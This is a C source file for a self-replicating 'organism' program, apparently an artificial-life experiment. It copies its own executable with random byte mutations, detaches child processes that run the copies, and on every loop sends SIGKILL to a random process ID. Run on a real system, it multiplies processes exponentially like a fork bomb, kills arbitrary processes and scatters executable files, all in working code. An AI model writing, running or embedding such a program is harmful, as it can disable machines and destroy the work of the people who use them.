#include <linux/random.h>
#include <sys/syscall.h>
#include <linux/fcntl.h>
#include <sys/types.h>
#include <unistd.h>
#include <signal.h> // SIGKILL

// This defines for how many loops this organism may live.
#define NUM_LOOPS 10U
// This defines the probability that a byte is mutated.
// A number of 3 means that 3 out of 10000 bytes will be mutated.
#define MUT_CHANCE 3U

// defined in file syscall.S
long syscall(long, ...);

int main(int argc, char** argv)
{
	int fd_in = -1, fd_out = -1;;

	for (unsigned i = 0; i < NUM_LOOPS; ++i)
	{
		// generate random filename
		char filename[21];
		while (-1 == syscall(SYS_getrandom, filename, 20, 0))
			;
		for (unsigned j = 0; j < sizeof(filename) - 1; ++j)
			filename[j] = filename[j] % 25 + 97;
		filename[20] = '\0';

		// read executable file of self
		fd_in = syscall(SYS_open, "/proc/self/exe", O_RDONLY);
		if (fd_in == -1)
			goto general_err;
		off_t filesize = syscall(SYS_lseek, fd_in, 0, SEEK_END);
		if (filesize == -1)
			goto in_file_err;
		if (syscall(SYS_lseek, fd_in, 0, SEEK_SET) == -1)
			goto in_file_err;
		char buf[filesize];
		if (syscall(SYS_read, fd_in, buf, filesize) == -1)
			goto in_file_err;
		
		if (syscall(SYS_close, fd_in) == -1)
			goto general_err;

		// write new executable
		fd_out = syscall(SYS_open, filename, O_WRONLY|O_CREAT, 0775);
		if (fd_out == -1)
			goto general_err;
		unsigned random_number;
		for (off_t j = 0; j < filesize; ++j)
		{
			while (-1 == syscall(SYS_getrandom, &random_number, sizeof(unsigned), 0))
				;
			unsigned n = random_number % 10000;
			if (MUT_CHANCE < n)
			{
				if (syscall(SYS_write, fd_out, buf + j, 1) == -1)
					goto out_file_err;
			}
			else
			{
				switch (random_number % 3)
				{
					case 0: // insert mutated byte
						if (syscall(SYS_write, fd_out, buf + j, 1) == -1)
							goto out_file_err;
						if (syscall(SYS_write, fd_out, &random_number, 1) == -1)
							goto out_file_err;
						break;
					case 1: // erase byte by not writing it
						break;
					case 2: // substitute with random byte
						if (syscall(SYS_write, fd_out, &random_number, 1) == -1)
							goto out_file_err;
						break;
				}
			}
		}
		syscall(SYS_close, fd_out);

		// try to kill random other process
		syscall(SYS_kill, random_number % 65536, SIGKILL);

		pid_t pid = syscall(SYS_fork);
		if (pid == 0)
		{
			// we're in the child
			// setsid lets the child run in its own session so that when parent
			// gets killed, the children won't.
			syscall(SYS_setsid);
			char* const cargv[] = {filename, NULL};
			char* const envp[]  = {NULL};
			syscall(SYS_execve, filename, cargv, envp);
			// should never get here unless execve fails
			syscall(SYS_unlink, filename);
			return 1;
		}
	}

	return 0;

	in_file_err:
		syscall(SYS_close, fd_in);
	out_file_err:
		syscall(SYS_close, fd_out);
	general_err:
		return 1;
}
